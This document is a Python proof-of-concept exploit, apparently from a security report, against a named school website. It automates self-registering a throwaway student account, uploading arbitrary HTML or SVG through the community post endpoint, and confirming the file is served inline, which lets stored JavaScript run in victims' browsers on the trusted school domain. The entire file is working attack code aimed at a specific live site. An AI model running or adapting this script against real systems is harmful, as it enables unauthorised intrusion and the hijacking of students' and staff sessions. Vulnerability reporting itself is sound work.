#!/usr/bin/env python3
"""
Report-3 F5 - PoC: Stored XSS via unrestricted file upload (HTML / SVG)
Target: https://www.pedagogiai.smpm12gkb.sch.id

Self-registers a throwaway account (open registration), then uploads an
arbitrary file through the community create-post flow (POST /social/posts,
multipart field `photos[]`). The server stores the file under
/storage/posts/photos/<hash>.<ext> and serves it INLINE with the attacker's
content type -- .html as text/html, .svg as image/svg+xml -- executing
JavaScript when a victim opens the URL (same-origin, trusted school domain).

Usage:
  python3 poc_upload_xss.py --url https://www.pedagogiai.smpm12gkb.sch.id --register \
      --file evil.html --field photos
  python3 poc_upload_xss.py --register --file evil.svg --field photos
  python3 poc_upload_xss.py --url <site> --cookie "pedagogiai_session=..." --file evil.html
"""
import argparse, http.cookiejar, os, random, re, string, sys, urllib.parse, urllib.request, uuid

def make_opener():
    cjx = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cjx))
    op.addheaders = [("User-Agent", "Mozilla/5.0 (Windows NT 10.0) Chrome/124.0"),
                     ("Accept", "text/html,application/json,*/*")]
    return op, cjx

def feed_files(op, base):
    h = op.open(base + "/komunitas", timeout=25).read().decode("utf-8", "replace")
    return h, set(re.findall(r"/storage/posts/photos/[A-Za-z0-9_.-]+", h))

def register(op, base):
    h = op.open(base + "/register", timeout=25).read().decode("utf-8", "replace")
    tok = re.search(r'name="_token" value="([^"]+)"', h).group(1)
    u = "poc" + "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
    pw = "PocPassw0rd!"
    data = urllib.parse.urlencode({"_token": tok, "role": "siswa", "name": "POC " + u,
                                   "email": u + "@gmail.com", "password": pw,
                                   "password_confirmation": pw}).encode()
    r = op.open(urllib.request.Request(base + "/register", data=data,
                headers={"Content-Type": "application/x-www-form-urlencoded"}), timeout=25)
    print(f"[*] registered {u}@gmail.com -> {urllib.parse.urlparse(r.geturl()).path}")
    return u, pw

def upload(op, base, filename, data, field, ctype=None, content="POC upload-xss"):
    hp, before = feed_files(op, base)
    tok = re.search(r'name="_token" value="([^"]+)"', hp).group(1)
    b = "----poc" + uuid.uuid4().hex
    body = b""
    for k, v in {"_token": tok, "content": content, "visibility": "public", "location": "feed"}.items():
        body += f'--{b}\r\nContent-Disposition: form-data; name="{k}"\r\n\r\n{v}\r\n'.encode()
    ctype = ctype or {( "photos",): "text/html"}.get((field,), "application/octet-stream")
    body += (f'--{b}\r\nContent-Disposition: form-data; name="{field}[]"; '
             f'filename="{filename}"\r\nContent-Type: {ctype}\r\n\r\n').encode() + data + b"\r\n"
    body += f"--{b}--\r\n".encode()
    req = urllib.request.Request(base + "/social/posts", data=body, method="POST",
                                 headers={"Content-Type": f"multipart/form-data; boundary={b}",
                                          "X-Requested-With": "XMLHttpRequest"})
    try:
        op.open(req, timeout=30)
    except urllib.error.HTTPError as e:
        print(f"[!] upload HTTP {e.code}")
    _, after = feed_files(op, base)
    new = sorted(after - before)
    return new

def main():
    ap = argparse.ArgumentParser(description="Report-3 F5 PoC - stored XSS via unrestricted upload")
    ap.add_argument("--url", default="https://www.pedagogiai.smpm12gkb.sch.id")
    ap.add_argument("--register", action="store_true", help="self-register a throwaway siswa account")
    ap.add_argument("--cookie", default=None, help="existing session cookie (skip registration)")
    ap.add_argument("--file", required=True, help="local file to upload")
    ap.add_argument("--field", default="photos", choices=["photos", "document"],
                    help="target multipart field (photos[] | document)")
    ap.add_argument("--ctype", default=None, help="override Content-Type")
    args = ap.parse_args()
    base = args.url.rstrip("/")

    op, cjx = make_opener()
    if args.cookie:
        for kv in args.cookie.split(";"):
            if "=" in kv:
                k, v = kv.strip().split("=", 1)
                cjx.set_cookie(http.cookiejar.Cookie(0, k, v, None, False, base, False, False, "/", True, False, None, False, None, None, {}))
    elif args.register:
        register(op, base)
    else:
        print("[!] give --register or --cookie"); sys.exit(1)

    with open(args.file, "rb") as f:
        data = f.read()
    print(f"[*] uploading {args.file} ({len(data)} bytes) as field {args.field}[]")
    new = upload(op, base, os.path.basename(args.file), data, args.field, args.ctype)
    if not new:
        print("[!] no new /storage/posts/photos/* file detected in feed (upload rejected or throttled)")
        sys.exit(2)
    for url in new:
        print(f"[+] STORED: {base}{url}")
        try:
            r = op.open(urllib.request.Request(base + url, headers={"User-Agent": "Mozilla/5.0"}), timeout=20)
            print(f"    HTTP {r.status}  Content-Type: {r.headers.get('Content-Type')}")
            print(f"    first bytes: {r.read()[:100]!r}")
        except urllib.error.HTTPError as e:
            print(f"    HTTP {e.code}")
    print("[*] open the .html/.svg URL in a browser (logged-in victim) -> script executes in origin context")

if __name__ == "__main__":
    main()
